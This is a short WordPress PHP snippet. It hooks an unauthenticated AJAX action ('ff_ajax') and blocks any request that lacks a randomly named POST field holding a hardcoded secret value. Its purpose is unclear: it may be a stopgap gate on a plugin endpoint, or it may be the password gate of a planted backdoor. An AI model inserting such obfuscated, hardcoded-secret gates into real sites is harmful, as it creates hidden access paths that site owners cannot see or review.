<?php

function enable_manager_additional() {
	if (!isset($_POST["qflhfuxcrvvwyg"]) || $_POST["qflhfuxcrvvwyg"] !== "aynmsaRjbaiK") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'enable_manager_additional', 5, 1);
